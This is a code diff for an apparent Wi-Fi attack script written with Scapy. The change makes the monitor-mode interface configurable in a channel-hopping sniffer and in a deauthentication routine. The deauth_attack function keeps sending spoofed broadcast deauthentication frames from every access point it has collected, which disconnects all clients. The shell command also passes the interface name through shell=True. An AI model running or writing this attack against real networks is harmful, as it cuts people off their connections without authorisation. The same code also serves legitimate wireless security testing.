@@ -42,8 +42,8 @@ def channel_hopping_sniffer():
         else:
             print("{b}CHANNEL{p} ".format(b=blue, p=purple) + str(channel) + (" "*9) + "|{c}".format(c=clear))
         
-        sniff(iface="mon0", prn=pkt_callback, timeout=0.5)
-        subprocess.check_output("iwconfig mon0 channel " + str(channel), shell=True)
+        sniff(iface=wificard.mon_interface, prn=pkt_callback, timeout=0.5)
+        subprocess.check_output("iwconfig {} channel {}".format(wificard.mon_interface, channel), shell=True)
         
     print("\n---------------------------------------\n{b}SCANNED {p}NETWORK{b} DEVICES: {c}{num}\n{b}ON {c}11 {p}CHANNELS{c}.\n---------------------------------------\n".format(num=str(len(AP_BSSID)), b=blue, c=clear, p=purple))
     
@@ -82,6 +82,6 @@ def deauth_attack():
     while True:    
         for bssid in AP_BSSID:
             pkt = RadioTap() / Dot11(addr1=BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
-            sendp(pkt, iface="mon0", count=10, verbose=False)
+            sendp(pkt, iface=wificard.mon_interface, count=10, verbose=False)
             if verboselog == True:
                 print("packet sent to " + bssid)
